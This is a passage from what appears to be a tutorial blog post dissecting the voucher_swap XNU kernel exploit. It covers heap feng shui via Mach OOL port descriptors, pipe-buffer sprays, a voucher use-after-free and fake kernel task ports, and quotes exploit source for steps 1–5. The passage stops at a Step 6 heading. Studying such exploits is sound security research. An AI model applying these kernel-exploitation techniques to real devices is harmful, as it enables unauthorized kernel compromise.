    <span class="mi">2927</span><span class="o">:</span> 				<span class="n">mach_port_guard_exception</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">kGUARD_EXC_SEND_INVALID_RIGHT</span><span class="p">);</span>
    <span class="mi">2928</span><span class="o">:</span> 			<span class="p">}</span>
    <span class="mi">2929</span><span class="o">:</span>             <span class="o">*</span><span class="n">mr</span> <span class="o">=</span> <span class="n">MACH_SEND_INVALID_RIGHT</span><span class="p">;</span>
    <span class="mi">2930</span><span class="o">:</span>             <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="mi">2931</span><span class="o">:</span>         <span class="p">}</span>
    <span class="mi">2932</span><span class="o">:</span> 
    <span class="mi">2933</span><span class="o">:</span>         <span class="k">if</span> <span class="p">((</span><span class="n">dsc</span><span class="o">-&gt;</span><span class="n">disposition</span> <span class="o">==</span> <span class="n">MACH_MSG_TYPE_PORT_RECEIVE</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
    <span class="mi">2934</span><span class="o">:</span>                 <span class="n">ipc_port_check_circularity</span><span class="p">(</span>
    <span class="mi">2935</span><span class="o">:</span>                     <span class="p">(</span><span class="n">ipc_port_t</span><span class="p">)</span> <span class="n">object</span><span class="p">,</span>
    <span class="mi">2936</span><span class="o">:</span>                     <span class="p">(</span><span class="n">ipc_port_t</span><span class="p">)</span> <span class="n">dest</span><span class="p">))</span>
    <span class="mi">2937</span><span class="o">:</span>             <span class="n">kmsg</span><span class="o">-&gt;</span><span class="n">ikm_header</span><span class="o">-&gt;</span><span class="n">msgh_bits</span> <span class="o">|=</span> <span class="n">MACH_MSGH_BITS_CIRCULAR</span><span class="p">;</span>
    <span class="mi">2938</span><span class="o">:</span> 
    <span class="mi">2939</span><span class="o">:</span>         <span class="n">objects</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">object</span><span class="p">;</span>
    <span class="mi">2940</span><span class="o">:</span>     <span class="p">}</span>
    <span class="mi">2941</span><span class="o">:</span> 
    <span class="mi">2942</span><span class="o">:</span>     <span class="k">return</span> <span class="n">user_dsc</span><span class="p">;</span>
    <span class="mi">2943</span><span class="o">:</span> <span class="p">}</span></code></pre></figure>

<p>On Line 2879, it calls kalloc to allocate memory in the heap in the kalloc zone and in line 2902, it is substituted as a variable <strong>objects</strong> which is an array of port pointers. On line 2909, each port is iterated in the descriptor and checked for validity. The function <strong>CAST_MACH_NAME_TO_PORT</strong> is called on the port which basically does this. If the port is <strong>MACH_PORT_DEAD</strong>, its filled with <strong>0xFFFFFFFFFFFFFFFF</strong>, and if its <strong>MACH_PORT_NULL</strong>, its filled with <strong>0x0000000000000000</strong>.</p>

<p>So basically, by sending a lot of Mach messages with OOL Port Descriptor, it is possible to allocate the kalloc zone with valid pointers, <strong>0xFFFFFFFFFFFFFFFF</strong> or <strong>0x0000000000000000</strong>. The same memory can be deallocated by receiving the message, and thereby poking holes within the memory. The contents of the received messages will be the ports and they can be analyzed for certain pattern to find overlaps. This technique has been used extensively in previous exploits for performing Heap Feng Shui.</p>

<p>The idea is to send Port pointers in a pattern such that <strong>iv_refs</strong> is overlapped with lower 32 bits of base port address (Little-Endian system) and its still not more than its max value. Sending base port address at a certain index in the pattern will overlap <strong>iv_refs</strong> with lower 32 bits and the next field with the upper 32 bits. Hence, incrementing iv_refs will basically increment the base port pointer.</p>

<p><img src="/images/voucher.png" alt="Pid" /></p>

<p>Similarly, overlapping <strong>iv_port</strong> with <strong>MACH_PORT_NULL</strong> will be just fine since we can call <strong>thread_get_mach_voucher</strong> to get a new voucher port that can use to manipulate the reference count again.</p>

<p>In order to allocate the freed voucher with Port pointers, it is essential to initiate zone garbage collection on the <strong>ipc vouchers</strong> zone. This can be done by allocating a large number of vouchers and then freeing them, essentially making that memory to be used again, the minimum size for which is 1 page, and then spraying the memory with port pointers as described above.</p>

<h3 id="pipe-buffers">Pipe Buffers</h3>

<p>Pipe is another system call in <strong>xnu</strong> used for IPC. It creates a pipe that allocates a pair of file descriptors and allows unidirectional data flow. The buffer through which the data flows is known as the <strong>pipe buffer</strong>. Data written to the write end of the pipe buffer can be read from the read end of the buffer, but not vice versa as this feature is not provided by <strong>xnu</strong>. This basically allows you to read and write into the same address space. The other important thing is that it occupies kva (kernel virtual address) space and hence is a useful primitive for allocating memory in the heap. Another important thing to note is that the pipe buffer size is set to a max value of <strong>16384</strong> bytes by default, and the whole pipe size for all the pipe buffers is set to <strong>16MB</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">bsd</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">pipe</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">68</span><span class="o">:</span> 
    <span class="mi">69</span><span class="o">:</span> <span class="cm">/*
    70:  * Pipe buffer size, keep moderate in value, pipes take kva space.
    71:  */</span>
    <span class="mi">72</span><span class="o">:</span> <span class="err">#</span><span class="n">ifndef</span> <span class="n">PIPE_SIZE</span>
    <span class="mi">73</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">PIPE_SIZE</span>	<span class="mi">16384</span>
    <span class="mi">74</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">75</span><span class="o">:</span> 
    <span class="mi">76</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">PIPE_KVAMAX</span>	<span class="p">(</span><span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">16</span><span class="p">)</span>
    <span class="mi">77</span><span class="o">:</span> 
    <span class="mi">78</span><span class="o">:</span> <span class="err">#</span><span class="n">ifndef</span> <span class="n">BIG_PIPE_SIZE</span>
    <span class="mi">79</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">BIG_PIPE_SIZE</span>	<span class="p">(</span><span class="mi">64</span><span class="o">*</span><span class="mi">1024</span><span class="p">)</span>
    <span class="mi">80</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">81</span><span class="o">:</span> 
    <span class="mi">82</span><span class="o">:</span> <span class="err">#</span><span class="n">ifndef</span> <span class="n">SMALL_PIPE_SIZE</span>
    <span class="mi">83</span><span class="o">:</span> <span class="err">#</span><span class="n">define</span> <span class="n">SMALL_PIPE_SIZE</span>	<span class="n">PAGE_SIZE</span>
    <span class="mi">84</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">85</span><span class="o">:</span> </code></pre></figure>

<p>If the data has been written to the pipe buffer and its full, then the pipe is considered to be blocked. To free that buffer, data must be read out from the pipe buffer. Data can be sprayed using pipe buffers by allocating many pipe buffers and writing data to it. The total number of pipes that can be created is the total pipe size (16 MB) divided by the pipe buffer size (16384 bytes), which is 1024.</p>

<p>The advantage of pipe buffers is that if we are able to get a pointer to one of our pipe buffers and read the value of it, we can basically identify which of those 1024 pipe buffers it is , and then reallocate data in that particular pipe buffer for our benefit.</p>

<p>What we are trying to achieve in this case for the <strong>voucher_swap</strong> exploit is getting a port pointer to point to one of the pipe buffers, identify which pipe buffer it is, and then reallocating data in that pipe buffer to create a <strong>fake port</strong>, which can allow us to do certain tasks. Since the Port pointer originally points to a port, if it is possible to somehow increment that port pointer to point to the pipe buffers, that will also work. Hence, you need to spray some ports first such that the <strong>ipc.ports</strong> zone for the ports grows and fresh pages are allocated from the zone map, then spray the pipe buffers such that the pipe buffers land just in front of the sprayed ports, and then manipulate the port pointer which pointed to one of the sprayed ports incrementally so that it lands into the pipe buffers. In this case, we will use the <strong>iv_refs</strong> field to point to a port pointer, and then use the vulnerability to leak references thereby increasing it (iv_refs) and pointing it to the pipe buffers.</p>

<p>Now once you receive the messages that you sent for the spray you get <strong>ipc_port</strong> and send rights to it. However, in this case one of the <strong>ipc_port</strong> pointer actually points to our pipe buffers. Now we can manipulate that port contents using the read and write functionality of pipe buffers.</p>

<p>So our exploitation steps should look like this.</p>

<ol>
  <li>Create the thread for which the voucher pointers will be kept</li>
  <li>Spray the Heap with Ports so that the <strong>ipc.ports</strong> zone will grow and allocate fresh pages from the zone map. Set the last port as the <strong>base_port</strong>.</li>
  <li>Spray the Pipe buffers and since the memory is freshly allocated, the pipe buffer will land just in front of the ports, since the memory will now be allocated incrementally. The pipe buffers content masks that of a port and each pipe buffers port content has a different <strong>IKOT</strong> type to identify later which pipe buffer overlaps.</li>
  <li>Spray the Vouchers and choose one Voucher to be freed. These vouchers will land in their own zone <strong>ipc vouchers</strong></li>
  <li>Store a Pointer to the selected voucher that was created in the previous step in the threads <strong>ith_voucher</strong> field. This will increase its reference count. Now use the vulnerability to reduce the reference count by one again, while still holding a pointer to the voucher</li>
  <li>Release the vouchers</li>
  <li>Spray using OOL Ports Descriptor by sending mach messages in a pattern (triggering GC) such that <strong>iv_refs</strong> is overlapped with the base port’s lower 32 bits and the <strong>iv_port</strong> will be <strong>MACH_PORT_NULL</strong>. Incrementing <strong>iv_refs</strong> will basically cross base port and land into the pipe buffers.</li>
  <li>Get a new voucher port by calling <strong>thread_get_mach_voucher</strong>. Now we can manipulate the overlapping freed voucher.</li>
  <li>Use reference counting bug to increase the <strong>iv_refs</strong> and point it to the pipe buffers</li>
  <li>Receive the message that was sent using OOL ports descriptor. Look at the ports that were received and find the overlapping pipe buffer by looking at the contents of the port.</li>
  <li>Since we can read and write into pipe buffers we can create a fake port in the pipe buffer.</li>
  <li>Create a fake <strong>IKOT_TASK</strong> port and read memory using <strong>pid_for_task</strong> 4 bytes at a time.</li>
  <li>Create a fake Kernel Task Port by copying <strong>ipc_space_kernel</strong> and kernels <strong>vm_map</strong> using the read primitives and writing them into the pipe buffers.</li>
  <li>Create a better fake Kernel Task Port using <strong>mach_vm_allocate</strong></li>
  <li>Read and Write Kernel Memory!</li>
</ol>

<p>Anyways, enough of background, let’s jump into the exploitation in detail.</p>

<h3 id="the-exploit">The Exploit</h3>

<p>If you haven’t downloaded it yet, get a copy of the <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1731#c10">voucher_swap</a> exploit code so you can follow along. In some cases, the comments are self explanatory so i am just gonna skip the explanation.</p>

<h4 id="step-1-create-a-separate-thread-for-the-voucher">Step 1: Create a Separate thread for the Voucher</h4>

<p>Create a separate thread where we will store the pointer to the voucher. The thread has an <strong>ith_voucher</strong> field where we can keep the reference to the voucher.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 1\. Create the thread whose ith_voucher field we will use during the exploit. This could</span>
    	<span class="c1">// be the current thread, but that causes a panic if we try to perform logging while not</span>
    	<span class="c1">// being run under a debugger, since write() will trigger an access to ith_voucher. To</span>
    	<span class="c1">// avoid this, we create a separate thread whose ith_voucher field we can control. In order</span>
    	<span class="c1">// for thread_set_mach_voucher() to work, we need to be sure not to start the thread.</span>
    	<span class="n">kr</span> <span class="o">=</span> <span class="n">thread_create</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="o">&amp;</span><span class="kr">thread</span><span class="p">);</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">kr</span> <span class="o">==</span> <span class="n">KERN_SUCCESS</span><span class="p">);</span></code></pre></figure>

<h4 id="step-2-create-pipes-for-the-spray">Step 2: Create Pipes for the spray</h4>

<p>Generate pipes for the spray. These pipes will be sprayed after the ports spray so they can land in adjacent memory. The maximum size allowed for a pipe buffer is <strong>16384</strong> bytes and the total size for all the pipe buffers is <strong>16MB</strong>. Therefore the total number of pipes that can be sprayed is <strong>1024</strong>. During the overlap, one of the pipes and its corresponding pipe buffer will overlap with the fake port.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 2\. Create some pipes so that we can spray pipe buffers later. We'll be limited to 16 MB</span>
    	<span class="c1">// of pipe memory, so don't bother creating more.</span>
    	<span class="n">pipe_buffer_size</span> <span class="o">=</span> <span class="mi">16384</span><span class="p">;</span>
    	<span class="kt">size_t</span> <span class="n">pipe_count</span> <span class="o">=</span> <span class="mi">16</span> <span class="o">*</span> <span class="n">MB</span> <span class="o">/</span> <span class="n">pipe_buffer_size</span><span class="p">;</span>
    	<span class="n">increase_file_limit</span><span class="p">();</span>
    	<span class="kt">int</span> <span class="o">*</span><span class="n">pipefds_array</span> <span class="o">=</span> <span class="n">create_pipes</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pipe_count</span><span class="p">);</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"created %zu pipes"</span><span class="p">,</span> <span class="n">pipe_count</span><span class="p">);</span></code></pre></figure>

<h4 id="step-3-spray-the-heap-with-ports">Step 3: Spray the Heap with Ports</h4>

<p>We need to spray a lot of IPC ports. Some of these ports will close the existing holes and force the kernel to allocate additional blocks from the zone map. When we spray the pipe buffers after that, we will assume that they land just in front of the ports. The <strong>filler_port_count</strong> is chosen to be <strong>8000</strong> based on trial and error. The <strong>base_port</strong> is the last port created using the <strong>create_ports</strong> call. Remember this as we will use it again in Step 8. The next memory block should be hopefully allocated next to the pipe buffers, and since the pipe size is <strong>16MB</strong>, our fake port which we will create inside the pipe buffer should be within the <strong>16MB</strong> range. On the first <strong>2000 ports</strong>, we also increase the queue limit, which is the maximum of messages that can be sent at once to the port. The reason for doing is on the first <strong>2000</strong> ports is because we will be sending messages using OOL ports descriptor to these ports in order to reallocate the freed vouchers, and hence having the ability to send more messages to these ports would help in the spray.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 3\. Spray a bunch of IPC ports. Hopefully these ports force the ipc.ports zone to grow</span>
    	<span class="c1">// and allocate fresh pages from the zone map, so that the pipe buffers we allocate next</span>
    	<span class="c1">// are placed directly after the ports.</span>
    	<span class="c1">//</span>
    	<span class="c1">// We want to do this as early as possible so that the ports are given low addresses in the</span>
    	<span class="c1">// zone map, which increases the likelihood that bits 28-31 of the pointer are 0 (which is</span>
    	<span class="c1">// necessary later so that the overlapping iv_refs field of the voucher is valid).</span>
    	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">filler_port_count</span> <span class="o">=</span> <span class="mi">8000</span><span class="p">;</span>
    	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">base_port_to_fake_port_offset</span> <span class="o">=</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">MB</span><span class="p">;</span>
    	<span class="n">mach_port_t</span> <span class="o">*</span><span class="n">filler_ports</span> <span class="o">=</span> <span class="n">create_ports</span><span class="p">(</span><span class="n">filler_port_count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"created %zu ports"</span><span class="p">,</span> <span class="n">filler_port_count</span><span class="p">);</span>
    	<span class="c1">// Grab the base port.</span>
    	<span class="n">base_port</span> <span class="o">=</span> <span class="n">filler_ports</span><span class="p">[</span><span class="n">filler_port_count</span><span class="p">];</span>
    	<span class="c1">// Bump the queue limit on the first 2000 ports, which will also be used as holding ports.</span>
    	<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">port_increase_queue_limit</span><span class="p">(</span><span class="n">filler_ports</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    	<span class="p">}</span></code></pre></figure>

<h4 id="step-4-spray-the-pipe-buffers">Step 4: Spray the Pipe buffers</h4>

<p>Next, we spray the heap with pipe buffers and hope they land just after the ports in memory.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 4\. Spray our pipe buffers. We're hoping that these land contiguously right after the</span>
    	<span class="c1">// ports.</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">pipe_buffer_size</span> <span class="o">==</span> <span class="mi">16384</span><span class="p">);</span>
    	<span class="n">pipe_buffer</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">pipe_buffer_size</span><span class="p">);</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">pipe_buffer</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">);</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">pipe_count</span> <span class="o">&lt;=</span> <span class="n">IO_BITS_KOTYPE</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    	<span class="kt">size_t</span> <span class="n">pipes_sprayed</span> <span class="o">=</span> <span class="n">pipe_spray</span><span class="p">(</span><span class="n">pipefds_array</span><span class="p">,</span>
    			<span class="n">pipe_count</span><span class="p">,</span> <span class="n">pipe_buffer</span><span class="p">,</span> <span class="n">pipe_buffer_size</span><span class="p">,</span>
    			<span class="o">^</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">pipe_index</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
    		<span class="c1">// For each pipe buffer we're going to spray, initialize the possible ipc_ports</span>
    		<span class="c1">// so that the IKOT_TYPE tells us which pipe index overlaps. We have 1024 pipes and</span>
    		<span class="c1">// 12 bits of IKOT_TYPE data, so the pipe index should fit just fine.</span>
    		<span class="n">iterate_ipc_ports</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="o">^</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">port_offset</span><span class="p">,</span> <span class="n">bool</span> <span class="o">*</span><span class="n">stop</span><span class="p">)</span> <span class="p">{</span>
    			<span class="kt">uint8_t</span> <span class="o">*</span><span class="n">port</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">data</span> <span class="o">+</span> <span class="n">port_offset</span><span class="p">;</span>
    			<span class="n">FIELD</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_bits</span><span class="p">,</span>       <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">io_makebits</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">IOT_PORT</span><span class="p">,</span> <span class="n">pipe_index</span><span class="p">);</span>
    			<span class="n">FIELD</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_references</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    			<span class="n">FIELD</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_mscount</span><span class="p">,</span>    <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    			<span class="n">FIELD</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_srights</span><span class="p">,</span>    <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    		<span class="p">});</span>
    	<span class="p">});</span>
    	<span class="kt">size_t</span> <span class="n">sprayed_size</span> <span class="o">=</span> <span class="n">pipes_sprayed</span> <span class="o">*</span> <span class="n">pipe_buffer_size</span><span class="p">;</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"sprayed %zu bytes to %zu pipes in kalloc.%zu"</span><span class="p">,</span>
    			<span class="n">sprayed_size</span><span class="p">,</span> <span class="n">pipes_sprayed</span><span class="p">,</span> <span class="n">pipe_buffer_size</span><span class="p">);</span></code></pre></figure>

<p>Also, for each pipe buffer, we are going to write the pipe buffer with possible <strong>ipc_port</strong> structs and change the 12 bits of <strong>IKOT_TYPE</strong> for the port to the pipe index. This will help us in finding the overalapping pipe amongst all the pipes, since the data in the pipe buffer will be interpreted as a fake port. This is done by the callback function <strong>update</strong> which in turn calls <strong>iterate_ipc_ports</strong> and sets the attributes for the <strong>ipc_port</strong>. This data is then written to the write end of the buffer.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="kt">size_t</span>
    <span class="nf">pipe_spray</span><span class="p">(</span><span class="k">const</span> <span class="kt">int</span> <span class="o">*</span><span class="n">pipefds</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">pipe_count</span><span class="p">,</span>
    		<span class="kt">void</span> <span class="o">*</span><span class="n">pipe_buffer</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">pipe_buffer_size</span><span class="p">,</span>
    		<span class="kt">void</span> <span class="p">(</span><span class="o">^</span><span class="n">update</span><span class="p">)(</span><span class="kt">uint32_t</span> <span class="n">pipe_index</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">))</span> <span class="p">{</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">pipe_count</span> <span class="o">&lt;=</span> <span class="mh">0xffffff</span><span class="p">);</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">pipe_buffer_size</span> <span class="o">&gt;</span> <span class="mi">512</span><span class="p">);</span>
    	<span class="kt">size_t</span> <span class="n">write_size</span> <span class="o">=</span> <span class="n">pipe_buffer_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
    	<span class="kt">size_t</span> <span class="n">pipes_filled</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    	<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pipe_count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    		<span class="c1">// Update the buffer.</span>
    		<span class="k">if</span> <span class="p">(</span><span class="n">update</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    			<span class="n">update</span><span class="p">((</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">i</span><span class="p">,</span> <span class="n">pipe_buffer</span><span class="p">,</span> <span class="n">pipe_buffer_size</span><span class="p">);</span>
    		<span class="p">}</span>
    		<span class="c1">// Fill the write-end of the pipe with the buffer. Leave off the last byte.</span>
    		<span class="kt">int</span> <span class="n">wfd</span> <span class="o">=</span> <span class="n">pipefds</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
    		<span class="kt">ssize_t</span> <span class="n">written</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">wfd</span><span class="p">,</span> <span class="n">pipe_buffer</span><span class="p">,</span> <span class="n">write_size</span><span class="p">);</span>
    		<span class="k">if</span> <span class="p">(</span><span class="n">written</span> <span class="o">!=</span> <span class="n">write_size</span><span class="p">)</span> <span class="p">{</span>
    			<span class="c1">// This is most likely because we've run out of pipe buffer memory. None of</span>
    			<span class="c1">// the subsequent writes will work either.</span>
    			<span class="k">break</span><span class="p">;</span>
    		<span class="p">}</span>
    		<span class="n">pipes_filled</span><span class="o">++</span><span class="p">;</span>
    	<span class="p">}</span>
    	<span class="k">return</span> <span class="n">pipes_filled</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<p>As we can see from Step 4, the <strong>iterate_ipc_ports</strong> basically considers the data as <strong>ipc_port</strong> structs and has a callback function specifying the port offset which is used to set the attributes of the ports.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cm">/*
     * iterate_ipc_ports
     *
     * Description:
     * 	A utility function to help iterate over data as an array of ipc_port structs in zalloc
     * 	blocks.
     */</span>
    <span class="k">static</span> <span class="kt">void</span>
    <span class="nf">iterate_ipc_ports</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">void</span> <span class="p">(</span><span class="o">^</span><span class="n">callback</span><span class="p">)(</span><span class="kt">size_t</span> <span class="n">port_offset</span><span class="p">,</span> <span class="n">bool</span> <span class="o">*</span><span class="n">stop</span><span class="p">))</span> <span class="p">{</span>
    	<span class="c1">// Iterate through each block.</span>
    	<span class="kt">size_t</span> <span class="n">block_count</span> <span class="o">=</span> <span class="p">(</span><span class="n">size</span> <span class="o">+</span> <span class="n">BLOCK_SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">/</span> <span class="n">BLOCK_SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">);</span>
    	<span class="n">bool</span> <span class="n">stop</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
    	<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">block</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">!</span><span class="n">stop</span> <span class="o">&amp;&amp;</span> <span class="n">block</span> <span class="o">&lt;</span> <span class="n">block_count</span><span class="p">;</span> <span class="n">block</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    		<span class="c1">// Iterate through each port in this block.</span>
    		<span class="kt">size_t</span> <span class="n">port_count</span> <span class="o">=</span> <span class="n">size</span> <span class="o">/</span> <span class="n">SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">);</span>
    		<span class="k">if</span> <span class="p">(</span><span class="n">port_count</span> <span class="o">&gt;</span> <span class="n">COUNT_PER_BLOCK</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">))</span> <span class="p">{</span>
    			<span class="n">port_count</span> <span class="o">=</span> <span class="n">COUNT_PER_BLOCK</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">);</span>
    		<span class="p">}</span>
    		<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">port</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">!</span><span class="n">stop</span> <span class="o">&amp;&amp;</span> <span class="n">port</span> <span class="o">&lt;</span> <span class="n">port_count</span><span class="p">;</span> <span class="n">port</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    			<span class="n">callback</span><span class="p">(</span><span class="n">BLOCK_SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">)</span> <span class="o">*</span> <span class="n">block</span> <span class="o">+</span> <span class="n">SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">)</span> <span class="o">*</span> <span class="n">port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stop</span><span class="p">);</span>
    		<span class="p">}</span>
    		<span class="n">size</span> <span class="o">-=</span> <span class="n">BLOCK_SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">);</span>
    	<span class="p">}</span>
    <span class="p">}</span></code></pre></figure>

<p>The callback function is used to update the pipe buffer and overwrite it with <strong>ipc_port</strong> structs.</p>

<h4 id="step-5-spray-the-heap-with-vouchers">Step 5: Spray the Heap with Vouchers</h4>

<p>Next, we spray the heap with Vouchers. And also choose one voucher port that will be eventually freed and call it <strong>uaf_voucher_port</strong>. As discussed in the previous article, memory is taken from the zone map in blocks. The size of a block is fixed for a particular object for a particular version (<strong>0x4000</strong> for <strong>ipc_voucher</strong> for <strong>iPhone11,8 16C50</strong>). Since the voucher size is also fixed (<strong>0x50</strong>), the number of voucher objects in a block is also fixed (<strong>0x4000/0x50 = 80</strong>) The idea is to allocate extra blocks where the voucher that we will free eventually (<strong>uaf_voucher_port</strong>) will be stored. The first <strong>300</strong> vouchers are basically to fill up the initial holes. And then we spray vouchers to take up about <strong>16</strong> blocks, where we plan to put our freed voucher in the target block (Block 7-10). These blocks will then be used for overlapping with OOL port pointers as we will see later.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 5\. Spray IPC vouchers. After we trigger the vulnerability to get a dangling voucher</span>
    	<span class="c1">// pointer, we can trigger zone garbage collection and get them reallocated with our OOL</span>
    	<span class="c1">// ports spray.</span>
    	<span class="c1">//</span>
    	<span class="c1">// Assume we'll need 300 early vouchers, 6 transition blocks, 4 target block, and 6 late</span>
    	<span class="c1">// blocks.</span>
    	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">voucher_spray_count</span> <span class="o">=</span> <span class="mi">300</span> <span class="o">+</span> <span class="p">(</span><span class="mi">6</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">*</span> <span class="nf">COUNT_PER_BLOCK</span><span class="p">(</span><span class="n">ipc_voucher</span><span class="p">);</span>
    	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">uaf_voucher_index</span> <span class="o">=</span> <span class="n">voucher_spray_count</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">*</span> <span class="nf">COUNT_PER_BLOCK</span><span class="p">(</span><span class="n">ipc_voucher</span><span class="p">);</span>
    	<span class="n">mach_port_t</span> <span class="o">*</span><span class="n">voucher_ports</span> <span class="o">=</span> <span class="n">voucher_spray</span><span class="p">(</span><span class="n">voucher_spray_count</span><span class="p">);</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"created %zu vouchers"</span><span class="p">,</span> <span class="n">voucher_spray_count</span><span class="p">);</span>
    	<span class="n">mach_port_t</span> <span class="n">uaf_voucher_port</span> <span class="o">=</span> <span class="n">voucher_ports</span><span class="p">[</span><span class="n">uaf_voucher_index</span><span class="p">];</span></code></pre></figure>

<h4 id="step-6-more-spraying">Step 6: More Spraying</h4>

